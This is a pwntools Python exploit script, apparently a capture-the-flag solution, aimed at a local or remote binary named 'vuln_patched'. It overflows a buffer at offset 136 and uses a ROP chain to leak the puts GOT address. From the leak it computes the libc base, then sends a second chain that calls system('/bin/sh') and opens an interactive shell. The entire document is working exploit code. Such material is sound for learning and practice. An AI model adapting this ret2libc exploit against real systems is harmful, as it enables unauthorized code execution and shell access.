from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x000000000040076f
continue
'''.format(**locals())

# Binary filename
exe = './vuln_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

libc = elf.libc

# Start program
io = start()

offset = 136
pop_rdi = 0x0000000000400913 # pop rdi; ret; 
ret = 0x000000000040052e  # ret; 



# Leak got puts
payload = flat({
    offset: [
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['do_stuff']
    ]
})

io.sendline(payload)
io.recvline()

# Get leak address
io.recvline()
got_puts = unpack(io.recv()[:6] + b"\x00"*2)
info("GOT puts %#x", got_puts)

# Calculate libc base address
libc.address = got_puts - libc.symbols['puts']

# ROP 2 Shell
sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
info("System address %#x", system)
info("/bin/sh address %#x", sh)

# Build the payload
payload = flat({
    offset: [
        pop_rdi,
        sh,
        ret,
        system
    ]
})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
